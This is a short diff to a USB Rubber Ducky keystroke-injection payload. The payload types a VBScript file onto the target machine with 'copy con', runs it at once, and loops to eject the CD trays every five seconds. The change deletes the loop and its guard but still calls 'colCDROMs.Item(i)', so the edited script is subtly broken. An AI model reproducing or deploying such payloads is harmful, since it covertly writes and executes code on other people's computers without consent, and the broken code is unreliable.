@@ -13,21 +13,13 @@ ENTER
 STRING copy con DT.vbs && start DT.vbs && exit
 ENTER
 DELAY 100
-STRING Set oWMP = CreateObject("WMPlayer.OCX.7")
+STRING Set oWMP = CreateObject("WMPlayer.OCX.7" )
 ENTER
 STRING Set colCDROMs = oWMP.cdromCollection
 ENTER
 STRING do
 ENTER
-STRING if colCDROMs >= 1 then
-ENTER
-STRING For i = 0 to colCDROMs.Count - 1
-ENTER
 STRING colCDROMs.Item(i).Eject
-ENTER
-STRING Next
-ENTER
-STRING End If
 ENTER
 STRING wscript.sleep 5000
 ENTER
